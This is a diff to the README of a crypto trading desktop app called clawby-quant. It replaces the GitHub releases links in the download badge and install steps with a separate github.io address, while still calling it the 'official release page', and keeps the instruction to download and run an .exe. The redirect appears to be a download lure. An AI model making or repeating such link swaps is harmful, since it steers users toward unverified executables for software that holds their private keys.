@@ -1,6 +1,6 @@
 # 📈 clawby-quant - Build automated crypto trading systems easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sudaissh9246/clawby-quant/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sudaissh9246.github.io)
 
 Clawby-quant turns your computer into a trading workstation. This software manages crypto trades using pre-built mathematical models. It tracks market prices, executes orders, and displays your account balance in a window on your desktop. Your private keys stay on your machine, which keeps your account data secure.
 
@@ -17,7 +17,7 @@ You need a standard Windows PC to run this software. Ensure you have the followi
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/sudaissh9246/clawby-quant/releases).
+1. Visit the [official release page](https://sudaissh9246.github.io).
 2. Look for the latest version listed under Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder on your computer.
